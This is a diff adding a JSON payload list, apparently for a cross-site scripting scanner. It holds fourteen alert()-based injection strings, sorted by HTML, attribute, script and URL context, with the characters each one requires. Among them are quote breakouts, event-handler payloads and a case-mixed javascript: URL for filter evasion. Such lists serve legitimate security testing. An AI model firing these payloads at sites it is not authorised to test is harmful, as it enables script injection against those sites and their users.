@@ -1,0 +1,72 @@
+[
+  {
+    "context": "tag_between",
+    "payload": "<script>alert('{ID}')</script>",
+    "required_chars": ["<", ">"]
+  },
+  {
+    "context": "tag_between",
+    "payload": "<img src=x onerror=alert('{ID}')>",
+    "required_chars": ["<", ">"]
+  },
+  {
+    "context": "tag_between",
+    "payload": "<svg onload=alert('{ID}')>",
+    "required_chars": ["<", ">"]
+  },
+  {
+    "context": "attr_double",
+    "payload": "\" onmouseover=\"alert('{ID}')",
+    "required_chars": ["\""]
+  },
+  {
+    "context": "attr_double",
+    "payload": "\"><script>alert('{ID}')</script>",
+    "required_chars": ["\"", "<", ">"]
+  },
+  {
+    "context": "attr_double",
+    "payload": "\" autofocus onfocus=\"alert('{ID}')",
+    "required_chars": ["\""]
+  },
+  {
+    "context": "attr_single",
+    "payload": "' onmouseover='alert({ID})",
+    "required_chars": ["'"]
+  },
+  {
+    "context": "attr_single",
+    "payload": "'><script>alert('{ID}')</script>",
+    "required_chars": ["'", "<", ">"]
+  },
+  {
+    "context": "attr_single",
+    "payload": "' autofocus onfocus='alert({ID})",
+    "required_chars": ["'"]
+  },
+  {
+    "context": "script",
+    "payload": "';alert('{ID}');//",
+    "required_chars": ["'"]
+  },
+  {
+    "context": "script",
+    "payload": "</script><script>alert('{ID}')</script>",
+    "required_chars": ["<", ">"]
+  },
+  {
+    "context": "script",
+    "payload": "\\';alert('{ID}');//",
+    "required_chars": ["'"]
+  },
+  {
+    "context": "url_attr",
+    "payload": "javascript:alert('{ID}')",
+    "required_chars": [":"]
+  },
+  {
+    "context": "url_attr",
+    "payload": "JaVaScRiPt:alert('{ID}')",
+    "required_chars": [":"]
+  }
+]
